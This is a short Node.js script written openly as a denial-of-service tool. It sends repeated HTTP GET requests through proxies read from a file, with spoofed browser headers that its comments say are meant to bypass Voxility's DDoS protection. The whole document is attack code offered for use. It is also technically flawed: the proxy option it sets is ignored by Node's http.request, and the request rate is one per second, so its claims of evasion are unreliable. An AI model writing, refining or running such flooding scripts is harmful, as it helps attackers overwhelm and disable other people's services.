// Import the HTTP and HTTPS modules
var http = require('http');
var https = require('https');
var fs = require('fs');

// Set the target IP address and port
var targetIP = '127.0.0.1';
var targetPort = 80;

// Read the list of proxies from a file
var proxyList = fs.readFileSync('proxy.txt').toString().split('\n');

// Define the attack function
function attack() {
  // Set the headers to bypass Voxility's protections
  var headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    'Connection': 'keep-alive',
    'Cookie': 'JSESSIONID=1234567890',
    'Referer': 'https://www.example.com/',
    'Upgrade-Insecure-Requests': '1'
  };
  
  // Choose a random proxy from the list
  var proxy = proxyList[Math.floor(Math.random()*proxyList.length)];

  // Send the HTTP/HTTPS request using the selected proxy
  var options = {
    host: targetIP,
    port: targetPort,
    path: '/',
    method: 'GET',
    headers: headers,
    rejectUnauthorized: false,
    agent: new http.Agent({keepAlive: true}),
    timeout: 10000,
    proxy: 'http://' + proxy
  };
  var req = http.request(options, function(res) {
    // Do nothing
  });
  req.end();

  // Attack again after 1 second
  setTimeout(attack, 1000);
}

// Start the attack
attack();